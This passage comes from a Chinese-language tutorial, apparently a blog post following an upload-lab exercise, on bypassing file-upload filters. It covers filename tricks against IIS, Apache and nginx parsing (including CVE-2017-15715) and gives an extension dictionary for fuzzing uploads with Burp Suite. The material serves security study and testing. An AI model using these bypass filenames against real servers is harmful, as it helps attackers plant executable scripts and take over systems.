                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/wps5.jpg"
                      alt="img"
                > </p>
<p>   2.与中间漏洞配合使用，如在iis 6.0上传1.php;1.jpg  或则  apache上传1.php.a都可以解析</p>
<p>与上面的方法步骤差不多</p>
<ol start="3">
<li>也可以利用hhh.php&#x2F;.  （限定Windows系统）步骤与前两种方法差不多</li>
</ol>
<h4 id="数组绕过：第二十关"><a href="#数组绕过：第二十关" class="headerlink" title="数组绕过：第二十关"></a>数组绕过：第二十关</h4><p>有的文件上传支持数组上传的话，如果逻辑写的有问题就会产生安全隐患，在白盒审计中发现居多，黑盒很难推测出来</p>
<h2 id="文件上传其他漏洞"><a href="#文件上传其他漏洞" class="headerlink" title="文件上传其他漏洞"></a>文件上传其他漏洞</h2><p>nginx0.83&#x2F;1.jpg%00php</p>
<p>apahce1x或者2x</p>
<p>当apache遇见不认识的后缀名，会从后向前解析例如1.php.rar不认识rar就向前解析，直到知道它认识的后缀名。</p>
<p>phpcgi漏洞(nginxiis7或者以上)上传图片后1.jpg。访问1.jpg&#x2F;1.php也会解析成php。</p>
<p>ApacheHTTPD换行解析漏洞（CVE-2017-15715）</p>
<p>apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h2 id="文件上传漏洞通用检测方法"><a href="#文件上传漏洞通用检测方法" class="headerlink" title="文件上传漏洞通用检测方法"></a>文件上传漏洞通用检测方法</h2><p>判断是否为黑白名单，如果是白名单 寻找可控参数。如果是黑名单禁止上传， </p>
<p>可以用有危害的后缀名批量提交测试，寻找遗留的执行脚本。 </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.php    .php5    .php4    .php3    .php2 </span><br><span class="line">.html   .htm     .phtml </span><br><span class="line">.pht    .pHp     .phP     .pHp5    .pHp4   .pHp3   .pHp2 </span><br><span class="line">.Html   .Htm     .pHtml </span><br><span class="line">.jsp    .jspa    .jspx    .jsw     .jsv    .jspf   .jtml   .jSp    .jSpx   .jSpa  .jSw  .jSv  .jSpf  .jHtml </span><br><span class="line">.asp    .aspx    .asa     .asax    .ascx   .ashx   .asmx </span><br><span class="line">.cer    .cEr </span><br><span class="line">.aSp    .aSpx    .aSa     .aSax    .aScx   .aShx   .aSmx </span><br><span class="line">.sWf    .swf </span><br><span class="line">.htaccess</span><br></pre></td></tr></table></figure></div>

<p>使用 burpsuite 抓包上传将后缀名设置成变量，把这些文件设置成一个字典批量提交，查看数据包大小 查看确定时候可上传即可。</p>
]]></content>
  </entry>
</search>
